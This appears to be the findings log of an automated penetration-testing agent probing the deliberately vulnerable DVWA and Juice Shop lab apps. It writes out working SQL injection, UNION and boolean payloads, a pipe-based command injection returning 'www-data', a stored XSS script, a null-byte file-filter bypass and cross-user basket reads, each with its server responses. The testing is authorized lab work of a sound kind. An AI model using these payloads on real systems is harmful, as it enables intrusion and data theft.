state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: Form action=/vulnerabilities/sqli/ method=GET; fields id (text), Submit (submit 'Submit'). Page shows 'User ID:' input; security level low.

GET /vulnerabilities/sqli/session-input.php returns a minimal page titled 'SQL Injection Session Input' with form action=/vulnerabilities/sqli/session-input.php method=POST, fields id (text, no maxlength) and Submit. Workflow for high: POST id to this endpoint, then GET /vulnerabilities/sqli/ to trigger the stored session value. Not yet exercised at high; high-level tests still pending (security must be raised to high via /security.php).

At security=medium, GET /vulnerabilities/exec/ shows form action=/vulnerabilities/exec/ method=POST with ip (text, no maxlength) and Submit. Page reports 'Security Level: medium'. Use pipe payload 127.0.0.1| whoami for medium bypass (';' and '&&' blacklisted per coordinator).

Form action=/vulnerabilities/xss_s/ method=POST; txtName text maxlength=10; mtxMessage textarea maxlength=50; submit btnSign ('Sign Guestbook') required; btnClear ('Clear Guestbook') also present. Existing guestbook entry 'test'/'This is a test comment.'
Security page confirms security_level=low. Form action=/security.php POST with security select, seclev_submit, hidden user_token=[REDACTED] (page-scoped).
GET /rest/products/search?q=apple returned 200 JSON {status:success,data:[products...]} (Apple Juice id 1, Apple Pomace id 24). Each product has id,name,description,price,deluxePrice,image.
POST JSON {email,password}. Wrong credentials (acct1_bench@juiceshop.local / invalid-probe) returned 401 'Invalid email or password.' Login is the auth surface; accepts JSON body.

Unauthenticated GET returned 200 JSON with 8 feedback records (UserId,id,comment,rating,createdAt). Comments include masked emails e.g. '(***in@juice-sh.op)'; anonymous entries have UserId null. Masked, so PII-disclosure must be confirmed by verifier.

Open directory listing (200 text/html) with Accept: text/html,application/json. Files: acquisitions.md (909B), announcement_encrypted.md, coupons_2013.md.bak (131B), eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak (4291B), suspicious_errors.yml, quarantine/.

Raw GET /ftp/package.json.bak returns HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' (Express fileServer.js verify). Confirms filter on raw path. Null-byte bypass (/ftp/package.json.bak%2500.md) NOT yet tested — pending verification.

Unauthenticated GET /ftp/acquisitions.md returns HTTP 200, text/markdown. Body: '# Planned Acquisitions' / '> This document is confidential! Do not distribute!' / 'Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...' Confidential memo directly retrievable.
Browsable directory listing (200 text/html) exposing jwt.pub (248B) and premium.key (50B).

acct1 GET /rest/basket/6 (own basket, session_info.own_basket_id=6) returns UserId 22 with Products: Apple Juice (1000ml) id=1, BasketItem id=9, quantity=3 (only item). acct1 GET /rest/basket/1 also returned 200 with UserId 1 basket (Apple Juice qty 2, Orange Juice qty 3, Eggfruit Juice qty 1) — a non-owned basket served to acct1, confirming missing ownership check. Verification step: acct2 GET /rest/basket/6 should return the Apple Juice qty 3 item.

Security page (GET) renders form action=/security.php POST with security select, seclev_submit=Submit, user_token hidden. Page body states 'Security level is currently: medium' while session_info reports security_level=low (session_info appears stale; body is authoritative). Current effective level = medium. Level-change is a POST to same URL.

At security=medium, GET /vulnerabilities/sqli/ renders form action=/vulnerabilities/sqli/ method=POST with fields id and Submit. Page shows 'User ID: 1 2 3 4 5 More Information' and 'Security Level: medium'. Use numeric boolean payloads 1 OR 1=1 (TRUE) vs 1 AND 1=2 (FALSE) in id.

findings.title: DVWA SQL Injection in id parameter [security=low]
findings.response_evidence: [security=low] TRUE condition returned 5 user records: 'ID: 1' OR '1'='1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE condition (1' AND '1'='2) returned HTTP 200 with 'User ID:' empty and zero 'First name/Surname' records. Surnames recorded: admin, Brown, Me, Picasso, Smith.

findings.title: DVWA OS Command Injection in ip parameter [security=low]
request_sequence: GET /vulnerabilities/exec/ (dvwa_admin, security=low) -- no user_token present in form
findings.response_evidence: [security=low] POST response HTTP 200 contains ping output for 127.0.0.1 (4 packets transmitted, 4 received) followed immediately by the injected command output line 'www-data' inside the 'Ping a device' results block.

findings.title: Juice Shop login authentication bypass via SQL injection in email field
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid token was issued for the first user admin@juice-sh.op without valid credentials.

findings.title: DVWA Stored XSS in guestbook message field [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin, security=low) form: txtName=tester&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook
findings.response_evidence: [security=low] POST returned 200 and the guestbook re-rendered with the new entry 'Name: tester'. Rendered DOM contains the stored element: <script id="test_token">window.xss_flag=1</script>. Browser evaluation of window.xss_flag returned 1.

findings.title: Juice Shop BOLA: cross-user basket read via GET /rest/basket/{id}
findings.response_evidence: acct1 own basket 6: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"name":"Apple Juice (1000ml)","BasketItem":{"quantity":3}}]}}. acct2 (own basket 7) requesting /rest/basket/6 received HTTP 200 with the same body: id 6, UserId 22 (acct1), Products: Apple Juice (1000ml), quantity 3. Account 2 read Account 1's basket contents.

findings.title: Juice Shop SQL injection in product search q parameter (unauthenticated)
findings.response_evidence: Baseline q=apple: 200 {"status":"success","data":[Apple Juice, Apple Pomace]} with no error. q=qwert': 500 "Error: SQLITE_ERROR: near \"'%'\": syntax error". q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: 200 {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}, showing the injected UNION columns reflected in the output.

findings.title: SQL Injection session-input workflow (High-level out-of-band input) - TRUE/FALSE not demonstrated at security=low
findings.response_evidence: [security=low] POST session-input.php returned HTTP 200 and echoed the stored value: visible_text "SQL Injection Session Input ... Session ID: 1' OR '1'='1 Close". Follow-up GET /vulnerabilities/sqli/ (no id parameter) returned HTTP 200 with "User ID: More Information ... Username: admin Security Level: low" and NO user surnames/records. So the session-stored value is not consumed by the low-level sqli page (low reads $_GET['id'] only). The TRUE condition therefore returned zero records, which does not satisfy the TRUE-returns-multiple-surnames criterion. The FALSE leg was not run because the session-input path is only consumed at high security. Not a confirmed finding at low; the session-input workflow should be tested at security=high (separate instance).

findings.title: Confidential acquisition memo exposed via open /ftp/ directory listing
findings.response_evidence:
Directory listing at /ftp/ returned HTTP 200 (text/html) and lists "acquisitions.md 909" and "package.json.bak 4291". GET /ftp/acquisitions.md returned HTTP 200, content_type text/markdown: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..." Confidential memo text retrieved without authentication.

findings.title: Poison null-byte bypass of /ftp/ file-type filter exposes restricted package.json.bak
findings.response_evidence:
Raw GET /ftp/package.json.bak returned HTTP 403: "Error: Only .md and .pdf files are allowed!". Null-byte bypass GET /ftp/package.json.bak%2500.md returned HTTP 200 (application/octet-stream) with restricted file content: "{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}". Filter bypass confirmed.

findings.title: Browsable /encryptionkeys/ directory exposes premium.key and jwt.pub
findings.response_evidence: HTTP 200, content_type text/html; charset=utf-8. Listing: "listing directory /encryptionkeys/ ... Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". Links: /encryptionkeys/jwt.pub and /encryptionkeys/premium.key. Both sensitive key files are browsable without authentication.

findings.title: Unauthenticated user-feedback listing exposes author identifiers (masked emails)
findings.response_evidence: HTTP 200 application/json, status=success, 8 records returned without authentication (ids 1-8). Records expose UserId, id, comment, rating, createdAt, updatedAt. Author emails appear only in masked form inside comment text: "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)"; 4 records have UserId null with "(anonymous)". No full author email address is disclosed in any field. Unauthenticated access to records is confirmed; full email PII disclosure is NOT confirmed because the addresses are masked. Partial disclosure of the domain and local-part fragments plus numeric UserIds remains a lower-severity information exposure.

findings.title: Cross-user basket access (BOLA): acct2 reads acct1's basket 6
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct2, email acct2_bench@juiceshop.local, own_basket_id=7)
findings.response_evidence: HTTP 200 application/json to acct2 session. Body: {"status":"success","data":{"id":6,"coupon":null,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3,...}}]}}. Basket 6 belongs to UserId 22 (acct1_bench), not acct2 (UserId 23, own basket 7). Distinct seeded item disclosed: Apple Juice (1000ml), quantity 3. Re-run once for this verification; the coordinator-noted prior finding was not checked against the store, so this record is a fresh confirmation.

findings.title: Open directory listing at /ftp/ exposes confidential files
request_sequence: GET http://juiceshop:3000/ftp/ with headers Accept: text/html,application/json (session unauth)
findings.response_evidence: HTTP 200 text/html, unauthenticated. Visible listing text: "listing directory /ftp/ ... quarantine ... acquisitions.md 909 ... announcement_encrypted.md 369237 ... coupons_2013.md.bak 131 ... eastere.gg 324 ... encrypt.pyc 573 ... incident-support.kdbx 3246 ... legal.md 3047 ... package.json.bak 4291 ... suspicious_errors.yml 723". Links include /ftp/acquisitions.md and /ftp/package.json.bak. Directory is browsable without authentication. Child document and null-byte bypass are already recorded as separate confirmed findings and are not re-verified here.

findings.title: Control endpoint verification: DVWA /security.php security-level change (no vulnerability)
request_sequence: POST http://dvwa/security.php form security=medium, seclev_submit=Submit, user_token=[REDACTED] (session dvwa_admin) -> 302 to /security.php
findings.response_evidence: [security=medium] Control-path check only, not a vulnerability. POST with a valid token returned 302 to /security.php. Follow-up GET returned 200 with page text "Security level set to medium" and "Security level is currently: medium". Token rotated after the POST (new hidden user_token=[REDACTED], consistent with normal anti-CSRF behavior. Note: the harness session_info field still reported security_level=low on the same responses; the page content is treated as authoritative. No weakness shown, so this is not a finding. The DVWA level is now medium; restore to low if other agents expect low.

findings.title: [security=medium] SQL Injection (numeric boolean) in POST id on /vulnerabilities/sqli/
findings.response_evidence: [security=medium] TRUE payload id=1 OR 1=1 -> HTTP 200, 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. Page shows 'Security level set to medium' and 'Security Level: medium'. FALSE payload id=1 AND 1=2 -> HTTP 200, zero records (only 'User ID: 1 2 3 4 5 More Information' with no ID/First name/Surname rows). Note: session_info metadata reported security_level 'low' while page body reported medium; the page body was treated as authoritative.

findings.title: [security=medium] OS Command Injection via pipe bypass in POST ip on /vulnerabilities/exec/
findings.response_evidence: [security=medium] HTTP 200 from POST with ip='127.0.0.1| whoami'. Response body under 'Ping a device' contains the output line 'www-data' (pre-block: 'www-data'). Payload used a pipe with no ';' or '&&', showing the medium-level blacklist is bypassed without those metacharacters. Page reports 'Security Level: medium'. Verification of ';' / '&&' blacklisting itself was not separately exercised.

findings.title: Poison null-byte bypass of /ftp file filter exposes restricted package.json.bak
findings.response_evidence: Raw path: HTTP 403, body 'Error: Only .md and .pdf files are allowed!' (Express fileServer.js verify). Null-byte path: HTTP 200, content-type application/octet-stream, body begins with package.json content: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}'. Both observations present, so the filter bypass is confirmed.

findings.title: [security=low] SQLi session-input endpoint: stored id not consumed at low (inconclusive)
request_sequence: GET /security.php (dvwa_admin) -> user_token f8186ca06b1c2cd69dd7cde38b430c9b; security was high
GET /vulnerabilities/sqli/ (dvwa_admin) -> no User ID records rendered
findings.response_evidence: [security=low] session-input echoes 'Session ID: 1' OR '1'='1' #' (200) and 'Session ID: 1' AND '1'='2' (200), but the subsequent GET /vulnerabilities/sqli/ with no id renders only the form and 'Security level set to low' with no 'ID:/First name:/Surname:' rows for either TRUE or FALSE. The stored session value does not affect the low-level page, which reads the GET id parameter. Therefore the session-input endpoint did not demonstrate injection at low. The underlying low-level SQLi is verified separately on GET /vulnerabilities/sqli/?id= (see companion finding).

findings.title: [security=low] SQL Injection (boolean, quoted) on /vulnerabilities/sqli/ id parameter
findings.response_evidence: [security=low] TRUE id=1' OR '1'='1 returned 5 records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (surnames: admin, Brown, Me, Picasso, Smith). FALSE id=1' AND '1'='2 returned zero records (no ID/First name/Surname rows); page shows 'Security Level: low'.

findings.title: Unauthenticated /api/Feedbacks: author email PII not disclosed (masked) - rejected
findings.response_evidence: 200 JSON {status:success, data:[8 records]} with fields UserId,id,comment,rating,createdAt,updatedAt. No dedicated email field exists. Emails appear only inside comment text and are masked: id1 '(***in@juice-sh.op)', id2 '(***@juice-sh.op)', id3 '(***der@juice-sh.op)', id4 '(***ereum@juice-sh.op)'. Remaining 4 records have UserId null and '(anonymous)'. Full email addresses are not disclosed, so PII exposure is not confirmed. Note: UserId integers are exposed unauthenticated, but that alone is not email disclosure.

findings.title: BOLA: juiceshop_acct2 reads acct1's basket 6 (Apple Juice qty 3)
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct2; session_info.own_basket_id=7, email acct2_bench@juiceshop.local)
findings.response_evidence: 200 {status:success,data:{id:6,UserId:22,Products:[{id:1,name:'Apple Juice (1000ml)',BasketItem:{ProductId:1,BasketId:6,id:9,quantity:3}}]}}. acct2's own basket is 7, so basket 6 (acct1's basket, owned by UserId 22) was returned to a different user. Distinct seeded item retrieved: Apple Juice (1000ml), quantity 3.

findings.title: DVWA security.php GET renders security-level control (no insecure default demonstrated)
findings.response_evidence: HTTP 200 text/html. Body reads 'Security level is currently: low.' with form action=http://dvwa/security.php method=POST fields security (select), seclev_submit=Submit, user_token (hidden). The page only displays and offers to change the level; it does not itself grant elevated access or demonstrate an insecure default. The earlier observation of 'medium' was not reproduced (current level is low), so the prior observation is stale. Verdict: rejected as a CWE-1188 vulnerability; this is a control/settings page.
